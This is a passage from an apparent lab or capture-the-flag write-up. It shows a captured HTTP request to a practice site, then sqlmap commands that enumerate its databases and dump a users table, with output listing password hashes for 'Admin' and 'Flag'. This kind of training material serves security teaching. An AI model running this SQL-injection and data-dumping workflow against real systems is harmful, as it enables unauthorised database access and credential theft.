Origin: http://status.inlanefreight.local
Connection: keep-alive
Referer: http://status.inlanefreight.local/
Cookie: PHPSESSID=rrrt2ck7dvkrhucup5ml8mia0r
Upgrade-Insecure-Requests: 1
Priority: u=0, i

searchitem=*
```

then run sqlamp 
```bash
sqlmap -r req.txt --batch --dbs
<SNIP>
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] status
[*] sys
<SNIP>
```
we will dump the `status` db witch look like it for our site we pensting 
```bash
sqlmap -r req.txt --batch -D status --dump
<SNIP>
Database: status
Table: users
[2 entries]
+----+-----------------------------------+----------+
| id | password                          | username |
+----+-----------------------------------+----------+
| 1  | 4528342e54d6f8f8cf15bf6e3c31bf1f6 | Admin    |
| 2  | 1fbea4df249ac4f4881a5da387eb297cf | Flag     |
+----+-----------------------------------+----------+
<SNIP>
```
we dump the db users table 


